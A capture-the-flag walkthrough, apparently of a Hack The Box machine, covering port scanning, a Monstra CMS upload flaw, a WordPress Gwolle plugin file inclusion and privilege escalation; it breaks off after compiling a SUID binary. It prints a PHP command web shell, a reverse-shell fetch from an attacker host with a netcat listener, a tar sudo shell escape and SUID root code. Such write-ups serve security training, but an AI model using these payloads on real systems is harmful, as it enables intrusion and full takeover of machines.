**Machine ip:** 10.10.10.88

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.88 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.88`

+ The result shows that only 1 TCP port is open:
```
Port 80: Apache httpd 2.4.18
```

+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ Navigate to `http://10.10.10.88/`

+ There's nothing interesting on the home page. Check the **robots.txt** file.
+ **robots.txt** gives a list of URLs that web robots are instructed not to visit.
+ Navigate to `http://10.10.10.88/robots.txt`

+ Discovered a **Monstra Content Management System (CMS)**, and the version number is **3.0.4**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/398c8557-d481-432f-8698-eb87791097ae)

+ Check whether it has any exploits.
+ `searchsploit monstra 3.0.4`
+ It's vulnerable to an authenticated RCE exploit. But firstly, it's a must to find credentials.

+ Navigate to `http://10.10.10.88/webservices/monstra-3.0.4/admin/`
+ As always, try default values `admin`:`admin`
+ OK, we successfully logged on with `admin`:`admin`

Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5',
'phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh',
'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat',
'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.


Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support â€“ though this is not an
official status on their site (last official patch was released on
2012-11-29), the GitHub appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426
```

+ Create a **cmd.php7** file, and upload:
```
<?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>
```

+ Capture the upload request on burp, and follow redirection.

+ It gives an error, "File was not uploaded". It's a rabbit hole, and skip it.

+ Do more enumeration.
+ Directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/ -k -n -x html,php,txt -r -t 50

+ When trying to access the **webservices** directory gives a 403 forbidden status code.
+ Run gobuster one more time on the **webservices** directory.
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.88/webservices -k -n -x html,php,txt -r -t 50
```

+ **wp** directory discovered under webservices.

+ Run wpscan adding **--plugins-detection aggressive** to enumerate plugins, themes, and users:
```
wpscan --url http://10.10.10.88/webservices/wp/ -e u,ap --plugins-detection aggressive
```

+ Check **gwolle** plugin whether it is vulnerable: `searchsploit gwolle`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a09586d5-f4a6-4338-83bc-7be62342d4da)

+ It is vulnerable to a remote file inclusion (RFI), and transfer it into your kali attack vm: `searchsploit -m 38861`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/62b7937a-5b63-4033-9776-711f35bacc24)

+ Check the vulnerability.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab590840-a92a-4baf-8fac-ec2c3e5dc227)

+ There's a RFI vulnerability in **http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path**

## Gaining Access
+ Create a reverse-shell, and name it **wp-load.php** on your kali attack vm: `cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php`
+ Specify ip and port.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1a21411f-21af-4307-82ff-279894963d88)
 
+ Serve it with SimpleHTTPServer where the shell is located: `sudo python3 -m http.server`
+ Set up a netcat listener on the attack machine to receive the reverse shell: `nc -lnvp 4444`
+ Navigate to `http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/` on your browser.
+ Get the shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bb683987-310f-44f3-8080-66e93bab3ac8)

+ **Alternatively**, get shell using **curl**:
```
curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/
```

+ Do more stable shell:
```
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

+ There is no privilege to read the user flag of onuma. Escalate the privileges.

## Privilege Escalation: from 'www-data' to 'onuma'
+ View commands the user can run using sudo without a password: `sudo -l`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/70b504a7-b501-4227-a809-3ec1a9f4535a)

+ User **www-data** can run **sudo** with **no** password and with **onuma's privileges** for **/bin/tar**.
+ Check gtfobins for [tar](https://gtfobins.github.io/gtfobins/tar/), and [sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)
+ Run the command to get a shell with onuma's privileges:
```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

+ Get the onuma's shell, and user flag.

## Privilege Escalation: from 'onuma' to 'root'
+ Transfer [pspy32](https://github.com/DominicBreuker/pspy/releases) to the target.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b023d1f-6172-4a79-b4ae-586a6e56fde8)

+ And run: `./pspy32`
+ It shows a script **/usr/sbin/backuperer** and a scheduled task that runs as root every 5 minutes.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b0642ba4-bd97-4c02-b0ff-5a4176d6fe41)

+ Check **backuperer.timer** files.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/60a9fe10-19fc-4a52-b8e5-4f121de388a5)

+ In **backuperer** binary file, when the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. Use 30 seconds to replace the backup tar file that the script created with our own malicious file. After 30 seconds, it will create a directory called "check" and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the backuperer program is run again and our files get deleted.

+ Create a **/var/www/html** directory in your current directory **/home/onuma**: `mkdir -p var/www/html`
+ Create your own compressed file **setuid.c** that contains a SUID executable to escalate privileges.
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
```

+ **Alternatively**,
```
#include <unistd.h>
int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

+ Compile the program: `gcc -m32 -o setuid setuid.c`
+ If you have meet a problem in the below, run `sudo apt-get install gcc-multilib`

+ Try compile one more time again, and transfer it into **/home/onuma/var/www/html** on the target.
